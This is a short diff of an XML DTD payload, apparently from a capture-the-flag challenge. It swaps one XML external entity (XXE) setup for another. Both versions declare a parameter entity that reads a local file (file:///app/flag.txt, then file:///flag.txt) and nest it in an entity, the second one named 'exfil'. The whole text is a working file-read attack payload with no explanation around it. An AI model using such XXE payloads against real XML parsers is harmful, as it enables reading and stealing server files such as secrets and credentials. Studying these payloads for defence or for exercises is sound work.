@@ -1,3 +1,2 @@
-<!ENTITY % f SYSTEM "file:///app/flag.txt">
-<!ENTITY % d "<!ENTITY xxe '%f;'>">
-%d;
+<!ENTITY % data SYSTEM "file:///flag.txt">
+<!ENTITY % param1 "<!ENTITY exfil '%data;'>">
